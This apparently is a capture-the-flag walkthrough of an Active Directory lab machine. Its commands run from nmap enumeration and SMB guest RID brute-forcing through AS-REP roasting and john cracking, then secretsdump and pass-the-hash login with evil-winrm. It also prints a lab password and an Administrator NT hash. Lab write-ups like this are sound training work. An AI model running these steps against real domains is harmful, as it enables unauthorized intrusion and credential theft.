we start by enumerating the target machine:

	sudo nmap -sV -p- 10.10.208.78  -Pn -O

output:

	53/tcp    open  domain        Simple DNS Plus
	88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-11 08:47:34Z)
	135/tcp   open  msrpc         Microsoft Windows RPC
	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
	389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
	445/tcp   open  microsoft-ds?
	464/tcp   open  kpasswd5?
	593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
	636/tcp   open  tcpwrapped
	3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
	3269/tcp  open  tcpwrapped
	5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	9389/tcp  open  mc-nmf        .NET Message Framing
	49665/tcp open  msrpc         Microsoft Windows RPC
	49668/tcp open  msrpc         Microsoft Windows RPC
	49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
	49670/tcp open  msrpc         Microsoft Windows RPC
	49683/tcp open  msrpc         Microsoft Windows RPC
	49693/tcp open  msrpc         Microsoft Windows RPC
	49705/tcp open  msrpc         Microsoft Windows RPC

there is smb open, we can try to list the shares available to everyone with the following command:

	smbclient -L \\\\\10.10.208.78\\

output:

 		Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing

to download it we use the command below:

	get VulnNet-Business-Anonymous
	get VulnNet-Enterprise-Anonymous

there are useless .txt with some names but nothing special.
if we look the output from smb we can see that there is $IPC share is accessible, and it can be use to bruteforce the RID(Used by Active Directory) with the following command:

	crackmapexec smb 10.10.208.78  -u 'guest' -p '' --rid-brute /guest it could be a defualt account/

output:

	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\guest: 
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  [+] Brute forcing RIDs
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  500: VULNNET-RST\Administrator (SidTypeUser)
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  501: VULNNET-RST\Guest (SidTypeUser)
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  502: VULNNET-RST\krbtgt (SidTypeUser)
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  512: VULNNET-RST\Domain Admins (SidTypeGroup)
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  513: VULNNET-RST\Domain Users (SidTypeGroup)
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  514: VULNNET-RST\Domain Guests (SidTypeGroup)
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  515: VULNNET-RST\Domain Computers (SidTypeGroup)
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  516: VULNNET-RST\Domain Controllers (SidTypeGroup)
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  517: VULNNET-RST\Cert Publishers (SidTypeAlias)
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  518: VULNNET-RST\Schema Admins (SidTypeGroup)
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  525: VULNNET-RST\Protected Users (SidTypeGroup)
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  526: VULNNET-RST\Key Admins (SidTypeGroup)
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
	SMB         10.10.208.78    445    WIN-2BO8M1OE1M1  572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)

we have a bunch of users we can try to use impacket-GetNPUsers in order to retrieve the TGT of the users with the options set to  UF_DONT_REQUIRE_PREAUTH(Do not require Kerberos preauthentication):

	impacket-GetNPUsers VULNNET-RST/t-skid -no-pass  #found the right user after different tries

output:

	$krb5asrep$23$t-skid@VULNNET-RST:<REDACTED>

we use john to crack it 

	nano hash
	john hash -w=/usr/share/wordlists/rockyout.txt

we have the password of t-skid user, we can access on his smb shares with this command:

	smbclient  \\\\10.10.208.78\\NETLOGON -U t-skid

output:

	ResetPassword.vbs
	get ResetPassword.vbs

inside the vbs script there are other credentials, we can use them in order to retrieve the NTDS.DIT,SAM hashes and other credentials.

command:

	impacket-secretsdump -dc-ip 10.10.208.78 a-whitehat:bNdKVkjv3RR9ht@10.10.208.78

we have the admin's NThash  we can access with evil-winRM with this command:

	evil-winrm -i 10.10.113.15 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d

we're in and if we search inside we can retrieve the 2 flags.
